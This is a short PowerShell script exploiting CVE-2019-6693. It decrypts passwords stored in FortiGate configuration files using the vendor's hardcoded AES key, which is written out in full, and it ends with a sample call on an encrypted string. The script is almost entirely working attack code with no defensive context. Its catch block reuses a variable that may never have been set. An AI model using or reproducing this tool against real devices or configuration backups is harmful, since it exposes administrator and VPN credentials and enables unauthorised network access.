# This code translates Fortigate password hashes to cleartext
# https://github.com/saladandonionrings/cve-2019-6693/blob/main/README.md
# https://medium.com/@bart.dopheide/decrypting-fortigate-passwords-cve-2019-6693-1239f6fd5a61

function Decrypt-Password {
    param (
        [string]$EncryptedPassword
    )
    $key = [system.Text.Encoding]::UTF8.GetBytes("Mary had a littl")
    #$key = [byte[]]@(77, 97, 114, 121, 32, 104, 97, 100, 32, 97, 32, 108, 105, 116, 116, 108)
    try {
        $data = [Convert]::FromBase64String($EncryptedPassword)
        $iv = $data[0..3] + @(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
        $ct = $data[4..($data.Length - 1)]
        $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $cipher.Key = $key
        $cipher.IV = $iv
        $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $decryptor = $cipher.CreateDecryptor()
        $pt = $decryptor.TransformFinalBlock($ct, 0, $ct.Length)
        return [System.Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0)
    } catch {
        return [string]::Copy($pt).TrimEnd([char]0).TrimStart("b'").TrimEnd("'")
    }
}

#Example
Decrypt-Password "umGOJVCWhGhoiuY/EjTZcZKjuuIkusDNkvdvUkU3awr5TGudxfmidR2bOyoBlQgHho0DuORJafh1WiCzaoBpRNv/gHCFC5mlPVcjjpHXTUvG47/qlBusgELO1ctsLt/4RVjov2S5R7+6DdkU/PbSZVoNkeINDQBsP3TTmxEz9+YyPleLzBZh4RKU2OKTsqe6TF/uHA=="

